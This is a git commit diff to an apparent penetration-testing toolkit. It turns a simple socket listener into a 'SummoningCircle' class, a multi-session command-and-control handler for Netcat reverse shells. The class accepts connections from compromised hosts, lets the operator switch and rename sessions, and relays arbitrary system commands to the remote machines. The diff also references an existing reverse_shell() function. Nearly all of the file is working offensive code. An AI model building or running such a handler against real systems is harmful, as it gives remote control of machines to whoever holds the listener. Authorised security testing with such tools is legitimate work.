80f1a1a39784ad8cd95276b380a8d69594da3c4e
ClutchTech <rollout26@gmail.com>
2022-11-24 20:56:32 -0500

    Listener rework -> SummoningCircle

--- TechBook/NetworkConjuration/shells.py
+++ TechBook/NetworkConjuration/shells.py
@@ -1,54 +1,118 @@
 import socket
-from subprocess import run
 from select import select
+from threading import Thread
+from time import sleep
+from subprocess import run
 
-"""
-Used for custom scripts / exploits during intrusive security tests.
-"""
 
-
-def listener(local_host: str, local_port: int, buffer_size: int = 1024, carriage_return: str = '\n') -> None:
+class SummoningCircle:
     """
-    Accept incoming connections from a remote host.
-    Run system commands to the remote host.
-
-    Notes:
-        - Works with netcat and reverse_shell().
-        - Carriage return is an option because different OS may expect different values.
-        - Unix typically '\n'. Windows '\r\n'.
+    Listener designed to work with Netcat reverse shells.
     """
+    def __init__(
+            self,
+            local_host: str = '0.0.0.0',
+            local_port: int = 5000,
+            command_prefix: str = '-sc',
+            buffer_size: int = 1024,
+            carriage_return: str = '\n',
+            timeout_in_sec: int = 5
+    ):
 
-    try:
-        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        s.bind((local_host, local_port))
-        s.listen(5)
-        print(f"Listening.")
+        self.local_host = local_host
+        self.local_port = local_port
+        self.command_prefix = command_prefix
 
-        client_socket, client_address = s.accept()
-        print(f"Connection: {client_address[0]}:{client_address[1]} ")
+        # Designed to be user settings down the road
+        self.buffer_size = buffer_size
+        self.carriage_return = carriage_return
+        self.timeout_in_sec = timeout_in_sec
+        self.active_client_session: int = 0
 
+        self.server: socket = None
+        self.clients = []
+
+    def bind_socket(self) -> None:
+        try:
+
+            self.clients = []
+            self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            self.server.bind((self.local_host, self.local_port))
+            self.server.listen(5)
+
+            print(f"Listening for connection(s)...")
+
+            while True:
+                client_socket, client_address = self.server.accept()
+                self.clients.append({
+                    "client_nickname": client_address,
+                    "client_address": client_address,
+                    "client_socket": client_socket
+                })
+
+                print(f"Connection: {client_address[0]}:{client_address[1]}")
+
+        except (KeyboardInterrupt, socket.error):
+            print(f'[-] Problem encountered: {socket.error} ')
+
+    def _shutdown(self):
+        try:
+            for client in self.clients:
+                client['client_socket'].close()
+            self.server.shutdown(socket.SHUT_RDWR)
+        except (socket.error, OSError, ValueError):
+            pass
+        self.server.close()
+        exit()
+
+    def _view_clients(self):
+        output = '[*] Summoned Connections\n\n'
+        for index, client in enumerate(self.clients):
+            output += f"{index}) {client['client_nickname']} -> {client['client_address']}\n"
+        return output
+
+    def _change_nickname(self, command: str):
+        split_command = command.split()
+        if len(split_command) > 3:
+            index = int(split_command[2])
+            name_change = split_command[3]
+            self.clients[index]['client_nickname'] = name_change
+
+    def _send_command(self, command: str) -> str:
+
+        client_socket = self.clients[self.active_client_session].get('client_socket')
+
+        client_socket.send(f"{command}{self.carriage_return}".encode())
+
+        # Confirm data is being sent with a timeout
+        ready = select([client_socket], [], [], self.timeout_in_sec)
+
+        if ready[0]:
+            return client_socket.recv(self.buffer_size).decode()
+
+        return 'Response timed Out.'
+
+    def interpreter(self):
         while True:
-            command = input('[NetworkConjuration]-$ ')
+            command = input('[NC]-$ ')
             if not command.strip():
                 # empty command
                 continue
 
-            client_socket.send(f"{command}{carriage_return}".encode())
-            if command.lower() == "nc exit":
-                # if the command is 'np exit', just break out of the loop
-                break
+            if command.lower() == f'{self.command_prefix} shutdown':
+                self._shutdown()
+            elif command.lower() == f'{self.command_prefix} view':
+                print(self._view_clients())
+            elif command.lower().startswith(f'{self.command_prefix} nickname'):
+                print(self._change_nickname(command=command))
+            else:
+                print(self._send_command(command=command))
 
-            # Confirm data is being sent with a timeout
-            ready = select([client_socket], [], [], 5)
-            if ready[0]:
-                output = client_socket.recv(buffer_size).decode()
-                print(output)
-
-        # s.close()
-
-    except (KeyboardInterrupt, socket.error):
-        print(f'[-] Problem encountered: {socket.error} ')
-        exit()
+    def start(self):
+        listener = Thread(target=self.bind_socket)
+        listener.start()
+        sleep(1)
+        self.interpreter()
 
 
 def reverse_shell(remote_host: str, remote_port: int, buffer_size: int = 1024) -> None:
@@ -84,3 +148,7 @@ def reverse_shell(remote_host: str, remote_port: int, buffer_size: int = 1024) -
 
     # close client connection
     s.close()
+
+
+if __name__ == '__main__':
+    SummoningCircle().start()
